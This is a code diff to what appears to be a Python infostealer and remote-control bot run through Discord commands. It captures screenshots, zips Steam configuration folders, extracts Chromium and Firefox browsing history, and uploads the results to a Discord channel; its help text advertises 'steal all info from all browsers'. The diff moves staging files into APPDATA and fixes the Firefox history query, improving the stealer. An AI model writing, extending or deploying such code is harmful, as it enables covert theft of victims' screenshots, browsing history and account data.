@@ -1,5 +1,6 @@
 import os, tempfile
 TEMP = tempfile.gettempdir()
+APPDATA = os.getenv('APPDATA')
 try:
     import requests
     import subprocess
@@ -141,7 +142,7 @@ class utils:
 class do:
     def screenshot():
         ss = pyautogui.screenshot()
-        path = os.path.join(TEMP, 'ss.png')
+        path = os.path.join(APPDATA, 'ss.png')
         ss.save(path)
 
 class getinfo:
@@ -169,7 +170,7 @@ class getinfo:
         zip_input = utils.search_disks_for_folder('\Program Files (x86)\Steam\config')
         if zip_input == None:
             return None, None
-        zip_dist = os.path.join(TEMP, f'temp{utils.get_string(5)}.zip')
+        zip_dist = os.path.join(APPDATA, f'temp{utils.get_string(5)}.zip')
 
         with zipfile.ZipFile(zip_dist, 'w', zipfile.ZIP_DEFLATED) as zipf:
             utils.zip(zip_input, zipf)
@@ -177,6 +178,7 @@ class getinfo:
         return zip_input, zip_dist
     
     class system:
+        # made fully by chat gpt i aint spending 20 mins to write that
         def get_size(bytes, suffix='B'):
             factor = 1024
             for unit in ['', 'K', 'M', 'G', 'T', 'P']:
@@ -267,7 +269,6 @@ class getinfo:
             return info
         
         def format(info):
-            # made fully by chat gpt i aint spending 20 mins to write that
             separator = "=" * 80
             fancy_title = lambda title: f"{separator}\n{title.center(80)}\n{separator}"
 
@@ -390,7 +391,7 @@ class getinfo:
             ]
 
             self.validpaths = []
-            self.mainfolder = os.path.join(TEMP, 'chromium_browsers')
+            self.mainfolder = os.path.join(APPDATA, 'chromium_browsers')
             self.localappdatapaths = utils.find_localappdata()
             self.find_all()
 
@@ -491,7 +492,7 @@ class getinfo:
             }
 
             self.validpaths = []
-            self.mainfolder = os.path.join(TEMP, 'gecko_browsers')
+            self.mainfolder = os.path.join(APPDATA, 'gecko_browsers')
             self.roamingappdatapaths = utils.find_roamingappdata()
             self.find_all()
 
@@ -524,7 +525,11 @@ class getinfo:
                         history_path = os.path.join(profilepath, 'places.sqlite')
                         conn = sqlite3.connect(history_path)
                         cursor = conn.cursor()
-                        cursor.execute('SELECT url, title, last_visit_time FROM urls')
+                        cursor.execute('''
+                            SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date 
+                            FROM moz_places 
+                            JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
+                        ''')
                         rows = cursor.fetchall()
 
                         output_path = os.path.join(self.mainfolder, name, f'History_{utils.get_string(5)}.txt')
@@ -532,17 +537,16 @@ class getinfo:
                         title_width = 100
                         last_visit_width = 30
 
-                        output = open(output_path, 'w', encoding='utf-8')
-                        output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
-                        output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
-                        for row in rows:
-                            url = self.remove_url_params(row[0])
-                            title = row[1]
-                            visit_time = self.convert_time(row[2])
-                            output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')
+                        with open(output_path, 'w', encoding='utf-8') as output:
+                            output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
+                            output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
+                            for row in rows:
+                                url = self.remove_url_params(row[0])
+                                title = row[1] if row[1] else 'No Title'
+                                visit_time = self.convert_time(row[2] // 1000000)
+                                output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')
 
                         conn.close()
-                        output.close()
                     except:
                         pass
 
@@ -634,7 +638,7 @@ getbrowsers ▶ steal all info from all browsers
                     elif message.content == f'{prefix}ss':
                         await message.delete()
                         do.screenshot()
-                        path = os.path.join(TEMP, 'ss.png')
+                        path = os.path.join(APPDATA, 'ss.png')
                         await message.channel.send(file=discord.File(path))
                         os.remove(path)
 
@@ -666,9 +670,9 @@ getbrowsers ▶ steal all info from all browsers
                         # CHROMIUM
                         chromium = getinfo.chromium()
                         chromium.get_history()
-                        chromiumfolder = os.path.join(TEMP, 'chromium_browsers')
+                        chromiumfolder = os.path.join(APPDATA, 'chromium_browsers')
 
-                        zip_dist = os.path.join(TEMP, f'temp{utils.get_string(5)}.zip')
+                        zip_dist = os.path.join(APPDATA, f'temp{utils.get_string(5)}.zip')
 
                         with zipfile.ZipFile(zip_dist, 'w', zipfile.ZIP_DEFLATED) as zipf:
                             utils.zip(chromiumfolder, zipf)
@@ -680,20 +684,20 @@ getbrowsers ▶ steal all info from all browsers
                         try:
                             os.remove(zip_dist)
                         except:
-                            pass
+                            print('FAILED TO REMOVE CHROMIUM ZIP')
 
                         try:
                             os.remove(chromiumfolder)
                         except:
-                            pass
+                            print('FAILED TO REMOVE CHROMIUM FOLDER')
 
 
                         # GECKO
                         gecko = getinfo.gecko()
                         gecko.get_history()
-                        geckofolder = os.path.join(TEMP, 'gecko_browsers')
+                        geckofolder = os.path.join(APPDATA, 'gecko_browsers')
 
-                        zip_dist = os.path.join(TEMP, f'temp{utils.get_string(5)}.zip')
+                        zip_dist = os.path.join(APPDATA, f'temp{utils.get_string(5)}.zip')
 
                         with zipfile.ZipFile(zip_dist, 'w', zipfile.ZIP_DEFLATED) as zipf:
                             utils.zip(geckofolder, zipf)
@@ -705,12 +709,12 @@ getbrowsers ▶ steal all info from all browsers
                         try:
                             os.remove(zip_dist)
                         except:
-                            pass
+                            print('FAILED TO REMOVE GECKO ZIP')
 
                         try:
                             os.remove(geckofolder)
                         except:
-                            pass
+                            print('FAILED TO REMOVE GECKO FOLDER')
 
                     elif message.content == f'{prefix}cls':
                         await message.delete()
